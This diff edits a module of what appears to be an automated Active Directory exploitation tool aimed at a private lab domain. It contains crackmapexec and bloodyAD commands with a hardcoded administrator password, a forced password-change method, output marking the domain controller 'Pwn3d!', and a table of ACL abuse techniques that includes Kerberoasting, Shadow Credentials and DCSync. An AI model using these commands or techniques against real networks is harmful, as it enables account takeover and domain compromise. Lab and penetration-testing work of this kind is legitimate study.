@@ -1,6 +1,13 @@
 # strategies/generic_write.py
 # Check with : crackmapexec smb 192.168.56.10 -u ADMINISTRATOR -p 'AutoPwn@1337!' -d sevenkingdoms.local
 # bloodyAD -H 192.168.56.10 -d sevenkingdoms.local -u ADMINISTRATOR -p 'AutoPwn@1337!' get object ADMINISTRATOR --attr pwdLastSet
+# GenericWrite    → write any *non-protected* attribute (pwdLastSet, spn, etc.)
+# GenericAll      → full control (write + delete + read + execute)
+#                  = GenericWrite + Delete + Read + ReadProperty + Execute
+# GenericAll strategies will include delete/modify ACL/etc.
+
+# GenericAll will inherit form GenericWrite
+# In exploit() : try GenericAll-only techniques first then fall back to super().super(creds) for the shared ones
 
 from dataclasses import dataclass
 from .exploit_strategy import ExploitStrategy
@@ -60,7 +67,7 @@ class GenericWriteStrategy(ExploitStrategy):
                     f"GenericWrite on {self.target.kind.value} — no known technique"
                 )
             
-    def _force_change_password_hash(self, creds: dict) -> ExploitResult:
+    def _force_change_password_hash(self, creds: dict) -> ExploitResult: # GENERICALL
         target_sam  = _sam(self.target.label)
         new_password = "AutoPwn@1337!"
 		# net rpc password "TargetUser" "newPass" -U "DOMAIN/User%Pass" -S "DC"
@@ -246,4 +253,15 @@ rania@DELL:~$ crackmapexec smb 192.168.56.10 -u ADMINISTRATOR -p 'AutoPwn@1337!'
 [*] Copying default configuration file
 SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
 SMB         192.168.56.10   445    KINGSLANDING     [+] sevenkingdoms.local\ADMINISTRATOR:AutoPwn@1337! (Pwn3d!)
+"""
+
+
+"""
+Reset password (user)                       GenericAll
+Write SPN --> Kerberoast                    GenericAll, GenericWrite
+Shadow Credentials (msDS-KeyCredentialLink) GenericAll, GenericWrite
+Add member (group)                          GenericAll, GenericWrite (if member is writable)
+Modify DADCL                                GenericAll
+DCSync (WriteDACL abuse)                    GenericAll
+Logon script abuse (scriptPath)             GenericAll, GenericWrite
 """
